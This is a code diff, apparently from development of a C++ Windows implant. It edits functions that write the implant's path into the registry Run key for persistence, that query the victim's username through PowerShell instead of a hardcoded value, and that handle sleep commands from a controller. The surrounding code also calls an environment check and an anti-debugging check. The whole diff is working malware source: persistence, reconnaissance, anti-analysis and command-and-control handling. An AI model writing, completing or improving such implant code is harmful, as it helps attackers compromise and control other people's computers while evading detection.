@@ -44,7 +44,7 @@ void make_persist(){
     std::string resp;
     res >> resp;
     resp = resp+ "\\main_implant.exe";
-    //std::cout << resp << std::endl;
+    std::cout << resp << std::endl;
     LPCSTR progPath = resp.c_str();
     HKEY hkey = NULL;
     LPCSTR path = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
@@ -81,9 +81,11 @@ Sleep(100);
 check_ch0nky();
 std::string cmd_usr = "$env:UserName";
 LPSTR username_cmd = const_cast<char *>(cmd_usr.c_str());
-std::string username = "vagrant";
-//runPowershellCommand(username_cmd);
-//std::cout << username << std::endl;
+std::string username;
+username = runPowershellCommand(username_cmd);
+username.erase(std::remove(username.begin(), username.end(), '\n'), username.end());
+std::cout << username << std::endl;
+
 make_persist();
 check_debugger();
 
@@ -92,9 +94,6 @@ check_debugger();
     CONFIG config;
     std::string info = getInfo();
     // std::cout << info << std::endl;
-    // if(System.Diagnostics.Debugger.IsAttached){
-        
-    // }
     json j = json::parse(info);
     //std::cout << j["systeminfo"] << std::endl;
 
@@ -231,8 +230,10 @@ check_debugger();
 
             }
         }else{
+                if(command["command_type"]=="sleep"){
                 std::string val = command["command_text"];
                 sleep_value =std::stoi(val);
+                }
                 //std::cout << sleep_value << "Hahaha" << std::endl;
         }
     }
